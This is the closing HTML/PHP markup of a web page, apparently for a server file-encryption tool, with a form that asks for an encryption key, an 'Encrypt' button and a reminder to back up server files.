				<form method="post" action="<?php echo './' . pathinfo($_SERVER['SCRIPT_FILENAME'], PATHINFO_BASENAME); ?>">
					<label for="key">Encryption Key</label>
					<input name="key" id="key" type="text" spellcheck="false" autofocus="autofocus">
					<p class="error"><?php echo $errorMessage; ?></p>
					<input type="submit" value="Encrypt">
				</form>
				<div class="advice">
					<p>Backup your server files!</p>
				</div>
			</div>
		</div>
	</body>
</html>
